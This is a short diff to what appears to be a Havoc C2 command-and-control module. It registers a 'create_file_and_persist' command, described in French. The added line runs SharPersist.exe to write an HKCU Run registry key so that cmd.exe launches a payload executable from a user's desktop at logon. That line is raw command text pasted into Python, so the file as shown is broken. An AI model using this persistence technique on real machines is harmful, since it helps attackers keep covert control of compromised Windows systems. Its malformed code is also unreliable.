@@ -37,3 +37,4 @@ def create_file_and_persist(demonID, *params):
     return TaskID
 
 RegisterCommand(create_file_and_persist, "", "create_file_and_persist", "Crée un fichier et configure la persistance avec SharPersist.", 1, "Aucun argument supplémentaire nécessaire", "")
+dotnet inline-execute /home/tbhone/Downloads/SharPersist.exe -t reg -c \"C:\Windows\System32\cmd.exe\" -a \"/c C:Users\cleme\Desktop\ex2.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add
